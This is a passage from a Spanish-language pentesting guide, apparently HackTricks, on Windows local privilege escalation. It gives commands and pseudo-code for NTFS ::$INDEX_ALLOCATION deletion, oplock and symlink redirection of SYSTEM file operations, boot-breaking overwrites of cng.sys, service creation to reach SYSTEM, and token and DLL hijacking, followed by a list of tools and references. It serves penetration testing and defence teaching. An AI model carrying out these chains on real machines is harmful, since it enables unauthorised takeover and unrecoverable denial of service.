La técnica principal de rollback de MSI (la anterior) supone que puedes eliminar una **carpeta entera** (por ejemplo, `C:\Config.Msi`). Pero ¿y si tu vulnerabilidad solo permite la **eliminación arbitraria de archivos**?

Podrías aprovechar los **internals de NTFS**: cada carpeta tiene un alternate data stream oculto llamado:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Este stream almacena los **metadatos del índice** de la carpeta.

Por lo tanto, si **eliminas el stream `::$INDEX_ALLOCATION`** de una carpeta, NTFS **elimina la carpeta completa** del sistema de archivos.

Puedes hacerlo mediante API estándar de eliminación de archivos, como:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Aunque estás llamando a una API para eliminar un *archivo*, **elimina la carpeta en sí**.

### De la eliminación del contenido de una carpeta a SYSTEM EoP
¿Qué pasa si tu primitive no te permite eliminar archivos/carpetas arbitrarios, pero **sí permite eliminar el *contenido* de una carpeta controlada por un atacante**?

1. Step 1: Configura una carpeta y un archivo señuelo
- Crea: `C:\temp\folder1`
- Dentro: `C:\temp\folder1\file1.txt`

2. Step 2: Coloca un **oplock** en `file1.txt`
- El oplock **pausa la ejecución** cuando un proceso privilegiado intenta eliminar `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Paso 3: Activar un proceso SYSTEM (p. ej., `SilentCleanup`)
- Este proceso analiza carpetas (p. ej., `%TEMP%`) e intenta eliminar su contenido.
- Cuando llega a `file1.txt`, se **activa el oplock** y se transfiere el control a tu callback.

4. Paso 4: Dentro del callback del oplock: redirigir la eliminación

- Opción A: Mover `file1.txt` a otro lugar
    - Esto vacía `folder1` sin interrumpir el oplock.
    - No elimines `file1.txt` directamente: liberarías el oplock prematuramente.

- Opción B: Convertir `folder1` en una **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Opción C: Crear un **symlink** en `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Esto apunta al flujo interno de NTFS que almacena los metadatos de la carpeta; al eliminarlo, se elimina la carpeta.

5. Paso 5: Liberar el oplock
- El proceso SYSTEM continúa e intenta eliminar `file1.txt`.
- Pero ahora, debido a la junction + symlink, en realidad está eliminando:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Resultado**: `C:\Config.Msi` es eliminado por SYSTEM.

### De la creación de carpetas arbitrarias a DoS permanente

Explota una primitiva que te permite **crear una carpeta arbitraria como SYSTEM/admin**, incluso si **no puedes escribir archivos** ni **establecer permisos débiles**.

Crea una **carpeta** (no un archivo) con el nombre de un **controlador crítico de Windows**, por ejemplo:
```
C:\Windows\System32\cng.sys
```

- Esta ruta normalmente corresponde al controlador en modo kernel `cng.sys`.
- Si la **precreas como carpeta**, Windows no puede cargar el controlador real durante el arranque.
- Entonces, Windows intenta cargar `cng.sys` durante el arranque.
- Encuentra la carpeta, **no puede resolver el controlador real** y **se bloquea o detiene el arranque**.
- **No hay alternativa ni recuperación** sin intervención externa (p. ej., reparación del arranque o acceso al disco).

### Desde rutas privilegiadas de registros/copias de seguridad + enlaces simbólicos OM hasta la sobrescritura arbitraria de archivos / DoS de arranque

Cuando un **servicio privilegiado** escribe registros o exportaciones en una ruta leída de una **configuración modificable**, redirige esa ruta con **enlaces simbólicos de Object Manager + puntos de montaje NTFS** para convertir la escritura privilegiada en una sobrescritura arbitraria (incluso **sin** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Requisitos**
- El atacante puede modificar la configuración que almacena la ruta de destino (p. ej., `%ProgramData%\...\.ini`).
- Capacidad para crear un punto de montaje hacia `\RPC Control` y un enlace simbólico de archivo OM (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Una operación privilegiada que escriba en esa ruta (registro, exportación, informe).

**Cadena de ejemplo**
1. Lee la configuración para averiguar el destino del registro privilegiado, p. ej., `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` en `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Redirige la ruta sin permisos de administrador:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Espera a que el componente privilegiado escriba el log (p. ej., el administrador activa «enviar SMS de prueba»). La escritura ahora se realiza en `C:\Windows\System32\cng.sys`.
4. Inspecciona el objetivo sobrescrito (con un parser hex/PE) para confirmar la corrupción; al reiniciar, Windows carga la ruta del controlador manipulado → **DoS por boot loop**. Esto también se aplica a cualquier archivo protegido que un servicio privilegiado abra para escritura.

> `cng.sys` normalmente se carga desde `C:\Windows\System32\drivers\cng.sys`, pero si existe una copia en `C:\Windows\System32\cng.sys`, puede intentarse cargar primero, lo que lo convierte en un destino fiable para causar DoS con datos corruptos.



## **De High Integrity a System**

### **Nuevo servicio**

Si ya estás ejecutando un proceso con High Integrity, la **ruta a SYSTEM** puede ser fácil: basta con **crear y ejecutar un servicio nuevo**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Al crear un binario de servicio, asegúrate de que sea un servicio válido o de que el binario realice rápidamente las acciones necesarias, ya que se cerrará en 20 s si no es un servicio válido.

### AlwaysInstallElevated

Desde un proceso de High Integrity, puedes intentar **habilitar las entradas del registro AlwaysInstallElevated** e **instalar** una reverse shell usando un wrapper _**.msi**_.\
[Más información sobre las claves del registro implicadas y cómo instalar un paquete _.msi_ aquí.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Puedes** [**encontrar el código aquí**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Si tienes esos privilegios de token (probablemente los encontrarás en un proceso que ya tenga High Integrity), podrás **abrir casi cualquier proceso** (excepto los procesos protegidos) con el privilegio SeDebug, **copiar el token** del proceso y crear un **proceso arbitrario con ese token**.\
Esta técnica suele consistir en **seleccionar cualquier proceso que se ejecute como SYSTEM con todos los privilegios de token** (_sí, puedes encontrar procesos SYSTEM que no tengan todos los privilegios de token_).\
**Puedes encontrar un** [**ejemplo de código que ejecuta la técnica propuesta aquí**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

meterpreter utiliza esta técnica para escalar privilegios en `getsystem`. Consiste en **crear una pipe y luego crear/abusar de un servicio para que escriba en ella**. Después, el **servidor** que creó la pipe usando el privilegio **`SeImpersonate`** podrá **suplantar el token** del cliente de la pipe (el servicio), obteniendo privilegios de SYSTEM.\
Si quieres [**saber más sobre las name pipes, deberías leer esto**](#named-pipe-client-impersonation).\
Si quieres leer un ejemplo de [**cómo pasar de High Integrity a System usando name pipes, deberías leer esto**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Si consigues **secuestrar una dll** que esté **cargando** un **proceso** que se ejecute como **SYSTEM**, podrás ejecutar código arbitrario con esos permisos. Por lo tanto, Dll Hijacking también es útil para este tipo de escalada de privilegios y, además, es mucho **más fácil de lograr desde un proceso de High Integrity**, ya que tendrá **permisos de escritura** en las carpetas utilizadas para cargar dlls.\
**Puedes** [**obtener más información sobre Dll hijacking aquí**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Lee:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Binarios estáticos de impacket](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**La mejor herramienta para buscar vectores de escalada de privilegios local en Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Busca configuraciones incorrectas y archivos confidenciales (**[**consulta aquí**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detectado.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Busca posibles configuraciones incorrectas y recopila información (**[**consulta aquí**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Busca configuraciones incorrectas**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrae información de sesiones guardadas de PuTTY, WinSCP, SuperPuTTY, FileZilla y RDP. Usa -Thorough localmente.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrae credenciales de Credential Manager. Detectado.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Prueba las contraseñas recopiladas en el dominio**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh es una herramienta de PowerShell para suplantación de ADIDNS/LLMNR/mDNS y man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Enumeración básica de Windows para privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Busca vulnerabilidades conocidas de privesc (OBSOLETO; se recomienda Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Comprobaciones locales **(requiere derechos de administrador)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Busca vulnerabilidades conocidas de privesc (debe compilarse usando VisualStudio) ([**precompilado**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumera el host en busca de configuraciones incorrectas (es más una herramienta para recopilar información que para privesc) (debe compilarse) **(**[**precompilado**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrae credenciales de muchos programas (exe precompilado en github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Adaptación de PowerUp a C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Busca configuraciones incorrectas (ejecutable precompilado en github). No se recomienda. No funciona bien en Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Busca posibles configuraciones incorrectas (exe de python). No se recomienda. No funciona bien en Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Herramienta creada a partir de esta publicación (no necesita accesschk para funcionar correctamente, pero puede usarlo).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lee el resultado de **systeminfo** y recomienda exploits funcionales (python local)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lee el resultado de **systeminfo** y recomienda exploits funcionales (Python local)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Tienes que compilar el proyecto usando la versión correcta de .NET ([consulta esto](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Para ver la versión de .NET instalada en el host víctima, puedes ejecutar:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Fundamentos de la escalada de privilegios en Windows](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Escalar privilegios aprovechando permisos débiles en carpetas](http://www.greyhathacker.net/?p=738)
- [3] [Escalada de privilegios en Windows: una cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Taller de escalada local de privilegios en Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Ataques a Windows: AT es el nuevo negro (Rob Fuller y Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Escalada de privilegios - Windows - Guía total de OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Escalada de privilegios - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Guía de escalada de privilegios en Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Lista de verificación de escalada de privilegios en Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Métodos de escalada de privilegios en Windows para pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: phishing con macro VBA de Word por SMTP → descifrado de credenciales de hMailServer → Veeam CVE-2023-27532 hasta SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak de cadena de formato + stack BOF → ROP con VirtualAlloc (RCE) y robo de token del kernel](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Tras la pista de Silver Fox: gato y ratón entre las sombras del kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Vulnerabilidad del sistema de archivos con privilegios presente en un sistema SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Herramientas de prueba de enlaces simbólicos – Uso de CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Un enlace al pasado. Abuso de enlaces simbólicos en Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [BOF de RegPwn (port de Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: resolución peligrosa de módulos en Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Módulos de Node.js: carga desde carpetas `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [package.json de npm: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Desafíos de la checklist de C/C++, resueltos](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Función RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Secuestro de binarios de servicios](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own con Microslop: encadenamiento de condiciones de carrera del kernel de CLDFLT y DirectX para LPE en Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Un anillo de I/O para gobernarlos a todos: una primitiva completa de lectura/escritura en Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Abusar de eliminaciones arbitrarias de archivos para escalar privilegios y otros trucos geniales](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - Código de exploit de FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Ataques a WSUS, parte 2: CVE-2020-1013, una vulnerabilidad de escalada local de privilegios de Windows 10 de día uno](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Exploración del Administrador de credenciales y Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - PoC de CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Delegación restringida basada en recursos de Kerberos: cuando un cambio de imagen conduce a una escalada de privilegios](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Extracción de claves privadas SSH del agente SSH de Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Convertir servidores de actualización empresariales en fábricas de backdoors (0_o) – Parte 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Convertir servidores de actualización empresariales en fábricas de backdoors (0_o) – Parte 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Escalada de privilegios mediante la eliminación de carpetas de Microsoft Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: rehaciendo tus pasos hasta NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
{{#include ../../banners/hacktricks-training.md}}
